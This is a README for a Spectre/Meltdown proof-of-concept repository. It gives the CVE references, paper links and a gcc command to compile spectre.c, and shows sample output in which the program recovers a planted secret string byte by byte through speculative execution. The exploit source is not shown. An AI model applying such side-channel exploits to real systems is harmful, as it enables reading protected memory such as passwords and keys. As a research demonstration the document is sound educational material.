# meltdown_specre

# Meltdown
CVE-2017-5754 is the official reference to Meltdown. 
https://meltdownattack.com/meltdown.pdf

# Specre
CVE-2017-5753 and CVE-2017-5715 are the official references to Spectre.
https://spectreattack.com/spectre.pdf

To Compile on ubuntu 16.04

    # gcc spectre.c -o spectre
 
Thank you to https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6 for this code.  I modified it to work on ubuntu-xenial-16.04-amd64-server-20170721 (ami-cd0f5cb6)
    
# Sample Output

    root@brakerubuntu:/tmp/src]# ./spectre
    Reading 40 bytes:
    Reading at malicious_x = 0xffffffffffdfebb8... Success: 0x54=’T’ score=2
    Reading at malicious_x = 0xffffffffffdfebb9... Success: 0x68=’h’ score=2
    Reading at malicious_x = 0xffffffffffdfebba... Success: 0x65=’e’ score=2
    Reading at malicious_x = 0xffffffffffdfebbb... Success: 0x20=’ ’ score=7 (second best: 0xDE score=1)
    Reading at malicious_x = 0xffffffffffdfebbc... Success: 0x4D=’M’ score=2
    Reading at malicious_x = 0xffffffffffdfebbd... Success: 0x61=’a’ score=2
    Reading at malicious_x = 0xffffffffffdfebbe... Success: 0x67=’g’ score=2
    Reading at malicious_x = 0xffffffffffdfebbf... Success: 0x69=’i’ score=2
    Reading at malicious_x = 0xffffffffffdfebc0... Success: 0x63=’c’ score=2
    Reading at malicious_x = 0xffffffffffdfebc1... Success: 0x20=’ ’ score=7 (second best: 0x00 score=1)
    Reading at malicious_x = 0xffffffffffdfebc2... Success: 0x57=’W’ score=2
    Reading at malicious_x = 0xffffffffffdfebc3... Success: 0x6F=’o’ score=2
    Reading at malicious_x = 0xffffffffffdfebc4... Success: 0x72=’r’ score=2
    Reading at malicious_x = 0xffffffffffdfebc5... Success: 0x64=’d’ score=7 (second best: 0x00 score=1)
    Reading at malicious_x = 0xffffffffffdfebc6... Success: 0x73=’s’ score=2
    Reading at malicious_x = 0xffffffffffdfebc7... Success: 0x20=’ ’ score=2
    Reading at malicious_x = 0xffffffffffdfebc8... Success: 0x61=’a’ score=7 (second best: 0x00 score=1)
    Reading at malicious_x = 0xffffffffffdfebc9... Success: 0x72=’r’ score=7 (second best: 0x05 score=1)
    Reading at malicious_x = 0xffffffffffdfebca... Success: 0x65=’e’ score=2
    Reading at malicious_x = 0xffffffffffdfebcb... Success: 0x20=’ ’ score=2
    Reading at malicious_x = 0xffffffffffdfebcc... Success: 0x53=’S’ score=7 (second best: 0x05 score=1)
    Reading at malicious_x = 0xffffffffffdfebcd... Success: 0x71=’q’ score=2
    Reading at malicious_x = 0xffffffffffdfebce... Success: 0x75=’u’ score=7 (second best: 0x05 score=1)
    Reading at malicious_x = 0xffffffffffdfebcf... Success: 0x65=’e’ score=2
    Reading at malicious_x = 0xffffffffffdfebd0... Success: 0x61=’a’ score=7 (second best: 0x05 score=1)
    Reading at malicious_x = 0xffffffffffdfebd1... Success: 0x6D=’m’ score=7 (second best: 0x00 score=1)
    Reading at malicious_x = 0xffffffffffdfebd2... Success: 0x69=’i’ score=7 (second best: 0x05 score=1)
    Reading at malicious_x = 0xffffffffffdfebd3... Success: 0x73=’s’ score=7 (second best: 0x00 score=1)
    Reading at malicious_x = 0xffffffffffdfebd4... Success: 0x68=’h’ score=7 (second best: 0x05 score=1)
    Reading at malicious_x = 0xffffffffffdfebd5... Success: 0x20=’ ’ score=2
    Reading at malicious_x = 0xffffffffffdfebd6... Success: 0x4F=’O’ score=7 (second best: 0x05 score=1)
    Reading at malicious_x = 0xffffffffffdfebd7... Success: 0x73=’s’ score=2
    Reading at malicious_x = 0xffffffffffdfebd8... Success: 0x73=’s’ score=2
    Reading at malicious_x = 0xffffffffffdfebd9... Success: 0x69=’i’ score=2
    Reading at malicious_x = 0xffffffffffdfebda... Success: 0x66=’f’ score=2
    Reading at malicious_x = 0xffffffffffdfebdb... Success: 0x72=’r’ score=2
    Reading at malicious_x = 0xffffffffffdfebdc... Success: 0x61=’a’ score=2
    Reading at malicious_x = 0xffffffffffdfebdd... Success: 0x67=’g’ score=2
    Reading at malicious_x = 0xffffffffffdfebde... Success: 0x65=’e’ score=7 (second best: 0x00 score=1)
    Reading at malicious_x = 0xffffffffffdfebdf... Success: 0x2E=’.’ score=2
